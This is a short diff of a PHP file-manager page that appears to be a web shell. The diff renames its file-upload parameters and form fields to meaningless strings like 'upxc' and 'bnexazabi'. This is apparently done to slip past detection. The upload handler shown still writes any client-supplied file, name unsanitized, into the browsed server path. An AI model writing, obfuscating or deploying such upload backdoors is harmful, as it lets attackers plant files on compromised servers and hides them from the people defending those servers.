@@ -135,7 +135,7 @@
     echo ('
 </div>
 <div class="form-inline">
-<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
+<a href="?upxc&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
 <a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
 </div>
 </nav>');
@@ -207,12 +207,12 @@
             echo ("<script>window.location.replace('?p=');</script>");
         }
     }
-    if (isset($_GET['upload'])) {
+    if (isset($_GET['upxc'])) {
         echo '
     <form method="post" enctype="multipart/form-data">
         Select file to upload:
-        <input type="file" name="fileToUpload" id="fileToUpload">
-        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
+        <input type="file" name="bnexazabi" id="bnexazabi">
+        <input type="submit" class="btn btn-dark" value="upofile" name="upofile">
     </form>';
     }
     if (isset($_GET['r'])) {
@@ -258,10 +258,10 @@
         }
     }
 
-    if (isset($_POST["upload"])) {
-        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
-        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
+    if (isset($_POST["upofile"])) {
+        $target_file = PATH . "/" . $_FILES["bnexazabi"]["name"];
+        if (move_uploaded_file($_FILES["bnexazabi"]["tmp_name"], $target_file)) {
+            echo "<p>".htmlspecialchars(basename($_FILES["bnexazabi"]["name"])) . " has been uploaded.</p>";
         } else {
             echo "<p>Sorry, there was an error uploading your file.</p>";
         }
